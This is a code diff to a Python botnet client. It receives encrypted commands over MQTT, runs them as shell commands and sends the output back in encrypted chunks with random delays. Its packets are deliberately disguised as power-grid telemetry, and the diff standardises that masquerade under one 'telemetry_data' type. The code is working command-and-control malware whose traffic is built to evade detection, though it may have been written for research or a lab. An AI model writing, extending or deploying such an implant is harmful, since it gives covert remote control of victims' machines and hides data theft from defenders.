@@ -33,7 +33,7 @@ def run_heartbeat(client):
 
         packet = {
             "s_id": BOT_ID,
-            "type": "telemetry_status",
+            "type": "telemetry_data",
             "v_line": round(random.uniform(229.0, 231.5), 1),
             DATA_KEY: encrypted_heartbeat
         }
@@ -64,12 +64,12 @@ def send_fragmented_response(client, raw_result):
 
         packet = {
             "s_id": BOT_ID,
-            "type": "telemetry_update", # Masquerade type
+            "type": "telemetry_data",
             DATA_KEY: encrypted_chunk
         }
         with mqtt_lock:
             client.publish(TOPIC, json.dumps(packet))
-        log(f"    Sent chunk {i+1}/{total} ({len(chunk_data)} bytes)")
+        log(f" - Sent chunk {i+1}/{total} ({len(chunk_data)} bytes)")
 
         # random delay
         # todo NOTE, for a realistic bot, this should be a lot longer - similar to the heartbeat probably,
@@ -87,6 +87,8 @@ def on_message(client, userdata, msg):
             payload_data = decrypt_payload(encrypted_data)
             parts = payload_data.split(" ", 1)
             action = parts[0]  # e.g., "ls"
+            if(DEBUG_PRINT):
+                log(f"[*] Received command: {action}")
             argument = parts[1] if len(parts) > 1 else ""
 
             # introduce random delay
@@ -109,7 +111,7 @@ def process_and_respond(client, action, argument):
 def create_bot_packet(encrypted_res_b64):
     res_packet = {
         "s_id": BOT_ID,
-        "type": "telemetry_ack",
+        "type": "telemetry_data",
         DATA_KEY: encrypted_res_b64
     }
     return res_packet
@@ -134,7 +136,6 @@ def get_action_result(action, argument):
             except subprocess.CalledProcessError as e:
                 # Return the actual error from the shell
                 return f"Command Error (Exit Code {e.returncode}): {e.output.decode().strip()}"
-
 
         if result == "":
             result = f"Command {action} executed successfully."
